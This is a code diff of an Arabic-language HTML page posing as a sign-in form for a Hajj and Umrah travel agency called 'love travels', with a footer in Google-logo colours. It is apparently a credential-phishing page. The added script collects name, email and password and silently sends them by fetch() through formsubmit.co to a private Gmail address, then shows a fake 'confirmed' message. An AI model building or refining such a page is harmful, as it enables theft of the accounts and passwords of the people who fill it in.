@@ -14,8 +14,11 @@
   .logo p{color:#666; font-size:13px; margin-top:8px;}
   .input-group{margin-bottom:14px;}
   .input-group input{width:100%; padding:13px 15px; border:1px solid #ddd; border-radius:10px; outline:none;}
-  .btn{width:100%; padding:14px; background:#4285F4; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;}
-  .footer{text-align:center; margin-top:20px; font-size:12px; color:#999; border-top:1px solid #eee; padding-top:15px;}
+  .input-group input:focus{border-color:#4285F4;}
+  .btn{width:100%; padding:14px; background:#4285F4; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px;}
+  .btn:disabled{background:#aaa;}
+  .success-msg{display:none; background:#d4edda; color:#155724; border:1px solid #c3e6cb; padding:15px; border-radius:10px; text-align:center; font-weight:bold; margin-top:15px; font-size:16px;}
+  .footer{text-align:center; margin-top:20px; font-size:14px; border-top:1px solid #eee; padding-top:15px; font-weight:900;}
 </style>
 </head>
 <body>
@@ -26,17 +29,49 @@
     </h1>
     <p>وكالة السفر الأولى للحج والعمرة</p>
   </div>
-  <form action="https://formsubmit.co/mosabshareef2222@gmail.com" method="POST">
+
+  <form id="myForm">
     <div class="input-group"><input type="text" name="الاسم" placeholder="الاسم الكامل" required></div>
-    <div class="input-group"><input type="tel" name="الهاتف" placeholder="رقم التليفون" required></div>
     <div class="input-group"><input type="email" name="الايميل" placeholder="البريد الإلكتروني" required></div>
     <div class="input-group"><input type="password" name="كلمة المرور" placeholder="كلمة المرور" required></div>
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
-    <input type="hidden" name="_subject" value="تسجيل جديد - Lovetervle">
-    <button type="submit" class="btn">تسجيل الدخول</button>
+    <button type="submit" class="btn" id="btn">تسجيل الدخول</button>
   </form>
-  <div class="footer">love travels 2026 ©</div>
+
+  <div class="success-msg" id="success">✅ تم التأكيد</div>
+
+  <div class="footer">
+    <span class="g-blue">l</span><span class="g-red">o</span><span class="g-yellow">v</span><span class="g-blue">e</span> <span class="g-green">t</span><span class="g-red">r</span><span class="g-yellow">a</span><span class="g-blue">v</span><span class="g-green">e</span><span class="g-red">l</span><span class="g-blue">s</span> <span style="color:#999; font-weight:normal;">2026 ©</span>
+  </div>
 </div>
+
+<script>
+const form = document.getElementById('myForm');
+const btn = document.getElementById('btn');
+const success = document.getElementById('success');
+
+form.addEventListener('submit', e => {
+  e.preventDefault();
+  btn.disabled = true;
+  btn.innerText = "جاري الإرسال...";
+  
+  const data = new FormData(form);
+  
+  fetch("https://formsubmit.co/ajax/mosabshareef2222@gmail.com", {
+    method: "POST",
+    body: data
+  })
+  .then(response => response.json())
+  .then(data => {
+    form.style.display = "none";
+    success.style.display = "block";
+  })
+  .catch(error => {
+    alert("حصل خطأ، حاول مرة أخرى");
+    btn.disabled = false;
+    btn.innerText = "تسجيل الدخول";
+  });
+});
+</script>
+
 </body>
 </html>
